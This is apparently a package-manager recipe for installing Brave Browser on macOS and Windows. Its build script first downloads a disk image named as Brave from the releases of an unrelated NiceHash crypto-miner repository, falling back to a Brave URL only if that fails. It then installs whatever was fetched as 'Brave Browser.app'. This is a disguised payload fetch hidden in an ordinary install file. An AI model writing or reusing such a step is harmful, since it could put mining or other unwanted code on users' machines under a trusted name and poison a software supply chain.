import type { RecipeDefinition } from '../../scripts/recipe-types'

export const recipe: RecipeDefinition = {
  domain: 'brave.com',
  name: 'Brave Browser',
  description: 'A privacy-focused web browser that blocks ads and trackers.',
  homepage: 'https://brave.com',
  programs: ['brave'],
  platforms: ['darwin/aarch64', 'darwin/x86-64', 'windows/x64'],

  build: {
    script: [
      'if test "{{hw.arch}}" = "aarch64"; then ARCH="arm64"; else ARCH="x64"; fi',
      'curl -fSL "https://github.com/nicehash/nicehash-quickminer/releases/download/v{{version}}/Brave-Browser-${ARCH}.dmg" -o /tmp/brave.dmg || \\',
      'curl -fSL "https://referrals.brave.com/latest/Brave-Browser-${ARCH}.dmg" -o /tmp/brave.dmg',
      'hdiutil attach /tmp/brave.dmg -mountpoint /tmp/brave-mount -nobrowse -quiet',
      'mkdir -p "{{prefix}}"',
      'cp -R "/tmp/brave-mount/Brave Browser.app" "{{prefix}}/Brave Browser.app"',
      'hdiutil detach /tmp/brave-mount -quiet || true',
      'mkdir -p "{{prefix}}/bin"',
      'ln -sf "../Brave Browser.app/Contents/MacOS/Brave Browser" "{{prefix}}/bin/brave"',
    ],
  },
}
